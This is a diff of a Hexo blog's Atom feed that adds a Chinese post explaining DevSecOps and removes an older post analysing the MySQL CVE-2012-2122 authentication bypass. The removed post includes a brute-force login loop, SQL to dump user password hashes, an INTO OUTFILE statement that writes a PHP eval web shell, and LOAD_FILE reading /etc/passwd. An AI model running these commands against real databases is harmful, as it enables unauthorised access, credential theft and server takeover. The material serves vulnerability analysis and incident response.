@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="/"/>
-  <updated>2019-10-14T08:46:38.187Z</updated>
+  <updated>2019-10-15T09:22:42.778Z</updated>
   <id>/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>DevSecOps</title>
+    <link href="/2019/10/DevSecOps/"/>
+    <id>/2019/10/DevSecOps/</id>
+    <published>2019-10-15T05:59:55.000Z</published>
+    <updated>2019-10-15T09:22:42.778Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="什么是-DevSecOps"><a href="#什么是-DevSecOps" class="headerlink" title="什么是 DevSecOps?"></a>什么是 DevSecOps?</h1><p>DevOps 不仅仅是开发和运营团队。如果您想要充分发挥出 DevOps 方法的敏捷性和响应力，则必须在应用的整个生命周期内同时兼顾 IT 安全性。</p><p>为什么？以往，安全性会在开发的最后阶段由特定的团队来负责实现。当开发周期长达数月、甚至数年时，上述做法不存在任何问题；但是，这种做法现在已经行不通了。有效的 DevOps 可顺利推进快速频繁的开发周期（有时全程只有数周或数天），但是过时的安全措施会对此造成负面影响，即使对于最高效的 DevOps 计划也是如此。</p><p><img src="https://i.loli.net/2019/10/15/K2QagWyBve19szV.png" alt="devsecopslinear405x259_0.png"></p><p>现在，安全防护在 DevOps 协作框架中属于共同责任，而且需要在整个周期中整合相应的安全功能。这是一个非常重要的理念。它还使得“DevSecOps”一词应运而生，以用于强调必须为 DevOps 计划打下扎实的安全基础。</p><p><img src="https://i.loli.net/2019/10/15/4ILjYnVaUBRWKsN.png" alt="devsecopscollab405x308_0.png"></p><p>DevSecOps 意味着，从一开始就要考虑应用和基础架构的安全性；同时还要让某些安全网关实现自动化，以防止 DevOps 工作流程变慢。选择正确的工具来持续确保安全性有助于实现安全目标。但是，有效的 DevOps 安全防护需要的不仅是新工具。它建立在 DevOps 文化变革的基础上，以便尽早集成安全团队的工作。</p><hr><h2 id="DevOps-安全性为内置特性"><a href="#DevOps-安全性为内置特性" class="headerlink" title="DevOps 安全性为内置特性"></a>DevOps 安全性为内置特性</h2><p>无论您将其称为“DevOps”还是“DevSecOps”，最好始终能在应用的整个生命周期内确保安全性。DevSecOps 关乎内置安全性，而不是应用和数据层面的安全性。如果将安全性问题留到开发流程的最后环节再加以考虑，那么采用 DevOps 方案的组织会发现自己的开发周期又变长了，而这是他们从一开始就想要避免的情况。</p><p>在某种程度上，DevSecOps 强调，在 DevOps 计划刚启动时就要邀请安全团队来确保信息的安全性，并制定自动安全防护计划。它还强调，要帮助开发人员从代码层面确保安全性；在这个过程中，安全团队需要针对已知的威胁分享可见性信息、提供反馈并进行智能分析。这可能还包括为开发人员提供新的安全培训，因为 DevSecOps 并非始终着眼于较为传统的应用开发模式。</p><p>那么，怎样才算是真正地实现了内置安全性？对于新手而言，优质的 DevSecOps 策略应能确定风险承受能力并进行风险/收益分析。在一个给定的应用中，需要配备多少个安全控制功能？对于不同的应用，上市速度又有多重要？自动执行重复任务是 DevSecOps 的关键所在，因为在管道中运行手动安全检查可能会非常耗时。</p><hr><h2 id="DevOps-安全性可自动实现"><a href="#DevOps-安全性可自动实现" class="headerlink" title="DevOps 安全性可自动实现"></a>DevOps 安全性可自动实现</h2><p>企业应该：确保采用时间短、频率高的开发周期；采取安全措施，以最大限度地缩短运营中断时间；采用创新技术，如容器和微服务；同时，还要促使常见的孤立团队加强合作 — 这对所有企业来说都是一项艰巨的任务。上述所有举措都与人有关，而且企业内部需要协同合作；但是，自动化才是有助于在 DevSecOps 框架中实现这些人员变化的关键所在。</p><p><img src="https://i.loli.net/2019/10/15/NPKhfVESyG4C2tj.png" alt="devsecopsautomation3549x160.png"></p><p>那么，企业应该在哪些方面实现自动化？具体又该怎么做呢？红帽提供了相应的书面指南来帮助解答上述问题。企业应该退后一步，并着眼于整个开发和运营环境。其中涉及：源控制存储库；容器注册表；持续集成和持续部署 (CI/CD) 管道；应用编程接口 (API) 的管理、编排和发布自动化；以及运营管理和监控。</p><p>全新的自动化技术已帮助企业提高了开发实践的敏捷性，还在推动采用新的安全措施方面起到了重要作用。但是，自动化并不是近年来 IT 领域发生的唯一变化。现在，对于大多数 DevOps 计划而言，容器和微服务等云原生技术也是一个非常重要的组成部分。所以，企业必须调整 DevOps 安全措施，以适应这些技术。</p><hr><h2 id="DevOps-安全性适用于容器和微服务"><a href="#DevOps-安全性适用于容器和微服务" class="headerlink" title="DevOps 安全性适用于容器和微服务"></a>DevOps 安全性适用于容器和微服务</h2><p>可通过容器实现的规模扩展和基础架构动态性提升改变了许多组织开展业务的方式。因此，DevOps 安全性实践必须适应新环境并遵循特定于容器的安全准则。云原生技术不适合用来落实静态安全策略和检查清单。相反，组织必须在应用和基础架构生命周期的每个阶段确保持续安全并整合相应的安全功能。</p><p>DevSecOps 意味着，要在应用开发的整个过程中确保安全性。要实现与管道的这种集成需要秉持一种全新的思维方式，就像使用新工具一样。考虑到这一点，DevOps 团队应该实现安全防护自动化，以保护整体环境和数据；同时实现持续集成/持续交付流程——可能还要确保容器中的微服务的安全性。</p><h3 id="环境和数据安全性："><a href="#环境和数据安全性：" class="headerlink" title="环境和数据安全性："></a>环境和数据安全性：</h3><h4 id="实现环境的标准化和自动化。"><a href="#实现环境的标准化和自动化。" class="headerlink" title="实现环境的标准化和自动化。"></a>实现环境的标准化和自动化。</h4><p>每项服务都应具有最小的权限，以最大限度地减少未经授权的连接和访问。</p><h4 id="实现用户身份和访问控制功能的集中化。"><a href="#实现用户身份和访问控制功能的集中化。" class="headerlink" title="实现用户身份和访问控制功能的集中化。"></a>实现用户身份和访问控制功能的集中化。</h4><p>由于要在多个点发起身份验证，因此严格的访问控制和集中式身份验证机制对于确保微服务安全性而言至关重要。</p><h4 id="使运行微服务的容器相互隔离并与网络隔离。"><a href="#使运行微服务的容器相互隔离并与网络隔离。" class="headerlink" title="使运行微服务的容器相互隔离并与网络隔离。"></a>使运行微服务的容器相互隔离并与网络隔离。</h4><p>这包括传输中和静止的数据，因为获取这两类数据是攻击者的高价值目标。</p><h4 id="加密应用与服务间的数据。"><a href="#加密应用与服务间的数据。" class="headerlink" title="加密应用与服务间的数据。"></a>加密应用与服务间的数据。</h4><p>具有集成式安全功能的容器编排平台有助于最大限度地降低发生未经授权访问的可能性。</p><h4 id="引入安全的-API-网关。"><a href="#引入安全的-API-网关。" class="headerlink" title="引入安全的 API 网关。"></a>引入安全的 API 网关。</h4><p>安全的 API 可提高授权和路由的可见性。通过减少公开的 API，组织可以减小攻击面。</p><h3 id="CI-CD-流程安全性："><a href="#CI-CD-流程安全性：" class="headerlink" title="CI/CD 流程安全性："></a>CI/CD 流程安全性：</h3><h4 id="集成适用于容器的安全性扫描程序。"><a href="#集成适用于容器的安全性扫描程序。" class="headerlink" title="集成适用于容器的安全性扫描程序。"></a>集成适用于容器的安全性扫描程序。</h4><p>应在向注册表添加容器的过程中实现这一点。</p><h4 id="自动在-CI-过程中完成安全性测试。"><a href="#自动在-CI-过程中完成安全性测试。" class="headerlink" title="自动在 CI 过程中完成安全性测试。"></a>自动在 CI 过程中完成安全性测试。</h4><p>其中包括在构建过程中运行安全性静态分析工具；而且在构建管道中提取任何预构建容器映像时，都要进行扫描，以检查是否存在已知的安全漏洞。</p><h4 id="在验收测试流程中加入针对安全性功能的自动化测试。"><a href="#在验收测试流程中加入针对安全性功能的自动化测试。" class="headerlink" title="在验收测试流程中加入针对安全性功能的自动化测试。"></a>在验收测试流程中加入针对安全性功能的自动化测试。</h4><p>自动执行输入验证测试，并针对验证操作实现身份验证和授权功能的自动化。</p><h4 id="自动执行安全性更新，例如针对已知漏洞打修补。"><a href="#自动执行安全性更新，例如针对已知漏洞打修补。" class="headerlink" title="自动执行安全性更新，例如针对已知漏洞打修补。"></a>自动执行安全性更新，例如针对已知漏洞打修补。</h4><p>通过 DevOps 实现这一点。这样，在创建记录在案的可跟踪更改日志时，管理员便无需登录生产系统。</p><h4 id="实现系统和服务配置管理功能的自动化。"><a href="#实现系统和服务配置管理功能的自动化。" class="headerlink" title="实现系统和服务配置管理功能的自动化。"></a>实现系统和服务配置管理功能的自动化。</h4><p>这样可以确保遵守安全策略，避免出现人为错误。审核和补救操作也应实现自动化。</p><p>以上信息来源：<a href="https://www.redhat.com/zh/topics/devops/what-is-devsecops" target="_blank" rel="noopener">https://www.redhat.com/zh/topics/devops/what-is-devsecops</a></p><h1 id="DevSevOps-部分实现方案"><a href="#DevSevOps-部分实现方案" class="headerlink" title="DevSevOps 部分实现方案"></a>DevSevOps 部分实现方案</h1><p>DevSecOps的目标是在短时间内使各种能力的人提高安全性。传统安全性的出发点是，一旦设计了系统，便可以由安全人员确定其安全缺陷，并由业务运营商在发布系统之前对其进行纠正。这允许将有限的安全检查应用于项目，并且避免了在大型系统中增加安全测试环境的需要。但是，以这种方式设计的流程仅在业务活动步伐迅猛且各方都同意的情况下才有效。不幸的是，安全性必须得以保证的理念逐渐被要求后，这个迭代过程便存在安全缺陷，并且此后在系统内部造成了固有风险。</p><p><a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">archerysec</a>: 是一个开源漏洞评估和管理工具，可帮助开发人员和渗透测试人员执行扫描和管理漏洞。准确的说这并不是一个完整的DevSecOps实现方案，但是在一般的DevOps中，不需要对Sec进行较大的投入下，满足的基本安全性能保证。当然也可以理解为，开发人员人手一个AWVS、openVAS扫描。</p><p>Gitlab+Jenkins+SonarQube：实现动态的代码审计，自动拖代码扫描出结果。目前据所知，有不少企业在这种方式上，开发Sonar插件来进行代码审计的安全性维护。</p><p>后面会采用开源的安全架构来实现Sec的功能，内容希望可以类似<a href="https://bloodzer0.github.io/ossa/" target="_blank" rel="noopener">ossa</a>，但又没必要这么全面。同样部分开源工具也和DevSecOps没太大关系的，但既然DevSecOps是为了每一个人的安全，开源工具在中小型甲方就有较大意义了。</p><p>参考文章：</p><p><a href="https://www.linkedin.com/pulse/what-devsecops-shannon-lietz?trkInfo=VSRPsearchId%3A946311454203481351%2CVSRPtargetId%3A6008272002333294592%2CVSRPcmpt%3Aprimary&amp;trk=vsrp_influencer_content_res_name" target="_blank" rel="noopener">What is DevSecOps?</a></p><p><a href="https://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling" target="_blank" rel="noopener">Threat Modeling</a></p><p><a href="https://christian-schneider.net/slides/OWASP-AppSecEU-2015_SecDevOps.pdf" target="_blank" rel="noopener">OWASP-AppSecEU</a></p><p><a href="https://github.com/devsecops/awesome-devsecops" target="_blank" rel="noopener">awesome-devsecops</a></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;什么是-DevSecOps&quot;&gt;&lt;a href=&quot;#什么是-DevSecOps&quot; class=&quot;headerlink&quot; title=&quot;什么是 DevSecOps?&quot;&gt;&lt;/a&gt;什么是 DevSecOps?&lt;/h1&gt;&lt;p&gt;DevOps 不仅仅是开发和运营团队。如果您想要
+      
+    
+    </summary>
+    
+    
+      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
+    
+  </entry>
   
   <entry>
     <title>FastJson 1.2.61 RCE</title>
@@ -474,29 +497,6 @@ int fun1()
     
     
       <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>MySQL历史漏洞分析</title>
-    <link href="/2019/04/MySQL%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>/2019/04/MySQL历史漏洞分析/</id>
-    <published>2019-04-12T06:05:30.000Z</published>
-    <updated>2019-04-12T08:54:58.191Z</updated>
-    
-    <content type="html"><![CDATA[<h3 id="MySQL历史漏洞分析"><a href="#MySQL历史漏洞分析" class="headerlink" title="MySQL历史漏洞分析"></a>MySQL历史漏洞分析</h3><p>前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使用少，而且是外包托管阿里云，因此并没有影响其他系统。拿到这个系统后，查看端口服务时发现，数据库端口对外开放，ssh对外开放，然后根据对系统的核查，猜测有可能存在以下问题：</p><p>1、后台弱口令或者登陆绕过</p><p>2、mysql弱口令</p><p>3、ssh弱口令爆破</p><p>经过后来优先对外的端口审查，发现是数据库漏洞，MySQL的cve-2012-2122，身份验证漏洞。</p><p>简单的说就是MySQL对身份验证上存在缺陷，大概256次登陆认证就会出现一次认证成功。并不在乎密码的正确性。</p><p>漏洞介绍：</p><pre><code>https://seclists.org/oss-sec/2012/q2/493</code></pre><p>漏洞原因：</p><pre><code>my_bool check_scramble(const uchar *scramble_arg, const char *message,               const uint8 *hash_stage2){  SHA1_CONTEXT sha1_context;  uint8 buf[SHA1_HASH_SIZE];  uint8 hash_stage2_reassured[SHA1_HASH_SIZE];  mysql_sha1_reset(&amp;sha1_context);  /* create key to encrypt scramble */ mysql_sha1_input(&amp;sha1_context, (const uint8 *) message, SCRAMBLE_LENGTH);  mysql_sha1_input(&amp;sha1_context, hash_stage2, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, buf);  /* encrypt scramble */ my_crypt((char *) buf, buf, scramble_arg, SCRAMBLE_LENGTH);  /* now buf supposedly contains hash_stage1: so we can get hash_stage2 */ mysql_sha1_reset(&amp;sha1_context);  mysql_sha1_input(&amp;sha1_context, buf, SHA1_HASH_SIZE);  mysql_sha1_result(&amp;sha1_context, hash_stage2_reassured);  return memcmp(hash_stage2, hash_stage2_reassured, SHA1_HASH_SIZE);}</code></pre><p>以上是问题出现的代码处，memcmp的返回值实际上是int，而my_bool却是char。那么在把int转换成char的时候，就有可能发生截断。比如，memcmp返回0×200，截断后变成了0，调用check_scramble函数的就误以为密码正确。</p><p>而此漏洞并不是版本通病是MySQL在编译时，需添加-fno-builtin，并且所使用的glibc是经SSE优化后的，只不过glibc是系统自带。</p><p>漏洞利用：</p><pre><code>使用如下poc：for i in `seq 1 1000`; do mysql -u root --password=root -h 127.0.0.1 2&gt;/dev/null; done</code></pre><p>环境采用vulhub的docker环境，测试成功后返回如下：</p><p><img src="\2019\04\MySQL历史漏洞分析\1555050537911.png" alt="1555050537911"></p><p>那么拿到数据库怎么尝试获取服务权限，可以获取数据库账号密码来维持对数据库的访问和root权限。</p><pre><code>select user,password from mysql.user;</code></pre><p><img src="\2019\04\MySQL历史漏洞分析\1555050975845.png" alt="1555050975845"></p><p>MySQL密码加密由sha1加密后再unhex加密再sha1加密的字段，可以再md5等密码查询网站查找。如上密码为123456。</p><p>还可以使用导出的形式，利用如下：</p><pre><code>Select &#39;&lt;?php eval($_POST[cmd])?&gt;&#39; into outfile &#39;/var/www/html/a.txt&#39;;  #这种需要知道web路径</code></pre><p>同样也可以使用load_file来查看系统文件等</p><pre><code>SELECT LOAD_FILE(&#39;/etc/passwd&#39;) </code></pre>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h3 id=&quot;MySQL历史漏洞分析&quot;&gt;&lt;a href=&quot;#MySQL历史漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;MySQL历史漏洞分析&quot;&gt;&lt;/a&gt;MySQL历史漏洞分析&lt;/h3&gt;&lt;p&gt;前段时间公司一托管的老系统，被木马勒索，然后紧急处理了一下，此系统使
-      
-    
-    </summary>
-    
-    
-      <category term="渗透测试" scheme="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
     
   </entry>
   
